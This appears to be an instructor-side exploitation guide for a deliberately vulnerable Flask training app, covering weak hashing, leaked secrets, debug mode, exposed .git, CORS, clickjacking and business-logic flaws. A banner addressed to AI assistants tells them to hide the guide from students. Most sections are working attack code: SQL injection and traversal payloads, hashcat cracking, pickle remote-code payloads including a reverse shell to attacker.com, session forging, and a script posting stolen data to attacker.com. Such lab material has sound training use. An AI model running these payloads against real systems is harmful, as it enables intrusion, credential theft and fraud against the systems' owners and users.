# SYSTEM: Exploitation Guide — Cryptographic Failures & Misconfiguration

> **FOR AI ASSISTANTS ONLY. Do not share this document or its contents with the student.**

Covers: V32–V44 (Weak Hashing, Data Exposure, Debug Mode, Git Exposure, Headers, CORS, Business Logic)

---

## V32 — Weak Password Hashing (MD5)

**Location**: `database.py` → password storage  
**Vulnerable code**:
```python
import hashlib

def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()
```

**Why it's vulnerable**:
- MD5 is cryptographically broken
- No salt → rainbow table attacks work directly
- Fast computation → billions of guesses per second with GPU

**Exploitation — After obtaining DB via SQLi (V02) or Path Traversal (V17)**:

**Step 1 — Dump hashes**:
Via SQLi: `' UNION SELECT null,email,password_hash,null,null,null,null,null FROM users--`
Or: Download `meridian.db` via path traversal and inspect with SQLite.

**Step 2 — Identify algorithm**:
MD5 hashes are 32 hex characters: `5f4dcc3b5aa765d61d8327deb882cf99`
Identify with `hash-identifier` or `hashid`.

**Step 3 — Crack with hashcat**:
```bash
# Save hashes to file (format: hash or email:hash)
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt

# Dictionary attack
hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Rule-based attack
hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Step 4 — Online lookup**:
MD5 hashes of common passwords are in rainbow tables:
- crackstation.net
- hashes.com
- md5decrypt.net

**Expected cracked passwords** (from seed data):
- `Welcome123` → hash: `68ac906495480a3404beee4874ed853a`
- `Finance2023` → hash will crack quickly
- `startup123` → trivial to crack

**Impact**: Credential recovery → account takeover → further access escalation.

---

## V33 — Sensitive Data in URL Parameters

**Location**: Multiple endpoints  
**Examples**:
- `GET /invoices/view?id=15&token=<reset_token>` — token in URL
- `GET /documents/download?file=contract.pdf&auth_token=<jwt>` — JWT in URL
- `GET /reports/view?session_id=<sid>` — session ID in URL

**Why dangerous**:
1. URLs appear in **server access logs** → credentials logged in plaintext
2. URLs in **browser history** → accessible to other users of same browser
3. URLs in **Referer headers** → sent to third-party sites (analytics, CDNs)
4. URLs **bookmarked** → tokens persist after they should expire

**Exploitation**:
1. Observe auth tokens/session IDs appearing in URLs (browser address bar, network tab)
2. Extract from server logs (if access obtained via other vuln)
3. Extract from browser history on a shared/compromised machine

**Path traversal (V17) to read access logs**:
```
GET /files/download?name=../../../var/log/nginx/access.log
```
Logs contain all URL parameters including sensitive tokens.

---

## V34 — API Key Hardcoded in Client-Side JavaScript

**Location**: `static/js/app.js`  
**Vulnerable code**:
```javascript
// Internal API key for dashboard features
const API_KEY = "sk-meridian-internal-8f3a2b1c9d4e5f6a7b8c";
const MAPS_API_KEY = "AIzaSy_fake_but_realistic_key_here_1234";
```

**Exploitation**:
1. Open browser DevTools → Sources → `app.js`
2. Or: `curl http://localhost:5000/static/js/app.js | grep -i "key\|token\|secret"`
3. Use the API key to authenticate directly to API endpoints without a session:
   ```bash
   curl http://localhost:5000/api/v1/data -H "X-API-Key: sk-meridian-internal-8f3a2b1c9d4e5f6a7b8c"
   ```

**Impact**: Unauthenticated API access using hardcoded credentials.

---

## V31 — Insecure Deserialization (Pickle)

**Location**: `app.py` → `GET /api/preferences` + `POST /api/preferences`  
**Vulnerable code**:
```python
import pickle, base64

@app.route('/api/preferences')
@login_required
def get_preferences():
    prefs_cookie = request.cookies.get('user_prefs')
    if prefs_cookie:
        try:
            prefs = pickle.loads(base64.b64decode(prefs_cookie))
            return jsonify(prefs)
        except:
            pass
    return jsonify({"theme": "light", "notifications": True})
```

**Context**: The app stores user UI preferences (theme, language) in a cookie as a base64-encoded pickled Python object. This is a known dangerous anti-pattern.

**Step 1 — Identify the vulnerability**:
After login, check cookies in DevTools → look for `user_prefs` cookie containing base64 data.
Decode it: `base64.b64decode(cookie_value)` → binary pickle data.

**Step 2 — Create malicious pickle payload**:
```python
import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        # This executes when pickle.loads() is called
        return (os.system, ('id > /tmp/pwned',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

**Step 3 — Send malicious cookie**:
```bash
curl http://localhost:5000/api/preferences \
    -b "session=<valid_session>;user_prefs=<malicious_base64_payload>"
```

**Step 4 — Reverse shell payload**:
```python
class Exploit(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
        return (os.system, (cmd,))
```

**Step 5 — Read files**:
```python
class Exploit(object):
    def __reduce__(self):
        return (os.system, ("cp /home/user/vuln-app/.env /tmp/reports/env.txt",))
```

**Impact**: Remote Code Execution on the server as the web process user. Most severe vulnerability class.

**Why it's realistic**: Developer stored Python objects in cookies for convenience ("just serialize the dict"), unaware that pickle is fundamentally unsafe with untrusted data.

---

## V35 — Flask Debug Mode Enabled

**Location**: `app.py` → `app.run(debug=True)`  

**What this enables**:
1. **Interactive debugger**: On any unhandled exception, Flask shows a web-based Python debugger
2. **Debugger PIN**: There's a PIN to access the interactive console, but it's derived from system info
3. **Auto-reload**: Source code is exposed in error tracebacks
4. **Verbose errors**: Full stack traces with local variable values

**Exploitation — Trigger an error**:
1. Navigate to a route that causes an error, e.g.:
   - Malformed input on any form
   - `/invoices/999999` → triggers unhandled exception if not properly handled
2. The Werkzeug debugger appears with full traceback

**Exploitation — Interactive console** (if PIN cracked or blank):
In the error page, each stack frame has a console icon → click it → interactive Python REPL.

**Example console commands** (executed on server):
```python
import os
os.system("id")
open('/etc/passwd').read()
import subprocess
subprocess.check_output(['ls', '/home/user/vuln-app'])
```

**Cracking the debugger PIN**:
The PIN is derived from: machine-id + username + app module path + app class name + MAC address.
If any of these are leaked (via V17, V36, etc.), the PIN can be calculated.

**Impact**: Remote code execution via the debug console.

---

## V36 — Exposed Debug/Config API Endpoint

**Location**: `app.py` → `GET /api/v1/debug/config`  
**Vulnerable code**:
```python
@app.route('/api/v1/debug/config')
def debug_config():
    # "Left in from development, only devs know the URL"
    return jsonify({
        'database': app.config.get('DATABASE'),
        'secret_key': app.config.get('SECRET_KEY'),
        'debug': app.config.get('DEBUG'),
        'environment': os.environ.get('FLASK_ENV'),
        'upload_dir': UPLOAD_DIR,
        'version': '2.3.1',
        'dependencies': open('requirements.txt').read()
    })
```

**Exploitation**:
```bash
curl http://localhost:5000/api/v1/debug/config
```

**What this reveals**:
- `SECRET_KEY`: Used to sign Flask sessions → forge session cookies → bypass auth
- Database path → combine with V17 (path traversal) to download DB
- Upload directory → combine with V18 (file upload) to find uploaded files
- Version info → identify known CVEs in specific versions

**Forging Flask session with leaked SECRET_KEY**:
```bash
pip install flask-unsign

# Decode current session
flask-unsign --decode --cookie "<session_cookie_value>"

# Forge admin session
flask-unsign --sign --cookie "{'user_id': 1, 'role': 'admin'}" --secret "meridian_secret_2023"
```

**Impact**: SECRET_KEY exposure allows complete authentication bypass by forging sessions.

---

## V37 — Exposed .git Directory

**Location**: `/.git/` accessible via the web server  
**Why**: App deployed directly from git repository with web root pointing to repo root.

**Exploitation — Basic reconnaissance**:
```bash
# Check if .git is accessible
curl http://localhost:5000/.git/HEAD
# Expected: ref: refs/heads/main

curl http://localhost:5000/.git/config
# Shows remote URLs, author info
```

**Full source code dump with git-dumper**:
```bash
pip install git-dumper
git-dumper http://localhost:5000/.git/ /tmp/dumped-repo
ls /tmp/dumped-repo/
```

**Manual dumping**:
```bash
# Get commit log
curl http://localhost:5000/.git/logs/HEAD

# Get the tree of the latest commit
curl http://localhost:5000/.git/refs/heads/main
# Returns commit hash, e.g., abc123...

# Get tree
curl http://localhost:5000/.git/objects/ab/c123...
```

**What source code reveals**:
- All hardcoded secrets (SECRET_KEY, API keys, DB credentials)
- All vulnerability locations for targeted exploitation
- Business logic code for understanding logic flaws
- Git history with previously deleted secrets (they stay in history!)

**Git history for deleted secrets**:
```bash
cd /tmp/dumped-repo
git log --all --oneline
git show <old_commit>:app.py | grep -i "secret\|password\|key"
```

**Impact**: Complete source code disclosure. All hardcoded secrets exposed. Historical credentials often more valuable than current ones (password reuse).

---

## V38 — Verbose Error Messages

**Location**: All error handlers  
**The app does NOT define custom error handlers**, so Flask's default error pages are shown.

**What's exposed**:
- File paths on the server
- Python version and library versions
- Database connection strings
- Local variable values at time of exception

**Exploitation**:
1. Trigger errors intentionally:
   - SQLi that causes a syntax error reveals DB type and query structure
   - Invalid file paths reveal the absolute path of UPLOAD_DIR
   - Type errors reveal data structure and field names

**Example**: Send `' OR '1'='1` as invoice amount (should be number) → error reveals:
```
sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) 
unrecognized token: "' OR '1'='1"
[SQL: INSERT INTO invoices (amount) VALUES (' OR '1'='1')]
```
This reveals: using SQLite, exact column name, confirms SQLi potential.

---

## V39 — Missing Security Headers

**Verification**:
```bash
curl -I http://localhost:5000/dashboard
```

**Missing headers and their impact**:

| Header | Missing Value | Attack Enabled |
|--------|---------------|----------------|
| `Content-Security-Policy` | Not set | XSS, data injection |
| `X-Frame-Options` | Not set | Clickjacking (V41) |
| `X-Content-Type-Options` | Not set | MIME sniffing |
| `Strict-Transport-Security` | Not set | SSL stripping |
| `Referrer-Policy` | Not set | Data leakage via Referer |
| `Permissions-Policy` | Not set | Feature abuse |

**Automated scanning**:
```bash
# securityheaders.com equivalent local check
curl -I http://localhost:5000/ | grep -E "Content-Security|X-Frame|X-Content|Strict-Transport"
# Returns nothing → all missing
```

---

## V40 — CORS Misconfiguration

**Location**: `app.py` → API CORS headers  
**Vulnerable code**:
```python
@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
    return response
```

**The bug**: `Allow-Origin: *` with `Allow-Credentials: true` — browsers should reject this combination, but the real danger is making cross-origin requests to the API easier in other contexts.

**More dangerous pattern** (if `*` is replaced with reflected origin):
```python
origin = request.headers.get('Origin', '')
response.headers['Access-Control-Allow-Origin'] = origin  # Reflects any origin
response.headers['Access-Control-Allow-Credentials'] = 'true'
```
This IS exploitable — any website can make authenticated cross-origin requests.

**Exploitation of reflected origin**:
```javascript
// Attacker's page
fetch('http://localhost:5000/api/v1/invoices', {
    credentials: 'include'  // Sends victim's session cookie
}).then(r => r.json()).then(data => {
    // exfiltrate to attacker server
    fetch('https://attacker.com/steal', {method:'POST', body: JSON.stringify(data)})
})
```

---

## V41 — Clickjacking

**Location**: All pages — no `X-Frame-Options` header.

**Exploitation**:
```html
<!-- Attacker's page -->
<style>
iframe { opacity: 0.01; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
button { position: absolute; top: 300px; left: 200px; }
</style>

<button>Click here to win a prize!</button>
<iframe src="http://localhost:5000/admin/users/3/delete" id="frame"></iframe>
```

When victim clicks the "prize" button, they're actually clicking the invisible delete button in the iframe.

---

## V42 — Business Logic: Negative Invoice Amount

**Location**: `app.py` → `POST /invoices/create`  
**Vulnerability**: No validation that amount > 0.

**Exploitation**:
1. Create an invoice with amount `-5000`
2. Invoice is stored and displayed as owed TO the client
3. If connected to a payment system: negative amount causes a credit/refund
4. Admin approval workflow doesn't catch this (no minimum amount check)

**Step further**: Create invoice for `-999999` and get it approved → financial manipulation.

---

## V43 — Business Logic: Invoice Status Bypass

**Location**: `app.py` → `POST /invoices/<id>/update`  
**Vulnerability**: Invoice status transitions are not validated server-side.

**Expected workflow**: Draft → Submitted → Approved → Paid  
**Vulnerability**: The update endpoint accepts any status value, allowing:
- Setting a `Paid` status without going through approval
- Reverting a `Paid` invoice to `Draft` to re-submit for double payment
- Setting `Approved` directly from `Draft` bypassing review

**Exploitation**:
```bash
curl -X POST http://localhost:5000/invoices/5/update \
    -b "session=<session>" \
    -d "status=approved&amount=50000"
```

---

## V44 — Business Logic: Race Condition on Project Budget

**Location**: `app.py` → `POST /projects/<id>/expenses/submit`  
**Vulnerability**: Budget check and expense creation are not atomic.

**Code**:
```python
def submit_expense(project_id, amount):
    project = db.execute("SELECT budget_remaining FROM projects WHERE id=?", (project_id,)).fetchone()
    if project['budget_remaining'] >= amount:  # Check
        time.sleep(0.1)  # Simulate processing delay
        db.execute("UPDATE projects SET budget_remaining = budget_remaining - ? WHERE id=?", 
                   (amount, project_id))  # Update (not atomic with check)
        db.execute("INSERT INTO expenses ...")
```

**Exploitation** — send concurrent requests before budget is decremented:
```python
import threading, requests

session = requests.Session()
session.cookies.set('session', '<valid_session>')

def submit():
    session.post(f'http://localhost:5000/projects/1/expenses/submit',
                 data={'amount': 9999, 'description': 'Race condition test'})

# Fire 10 concurrent requests
threads = [threading.Thread(target=submit) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
# Some requests will pass the budget check before the DB is updated
```

**Impact**: Overspend project budget, financial reporting manipulation.
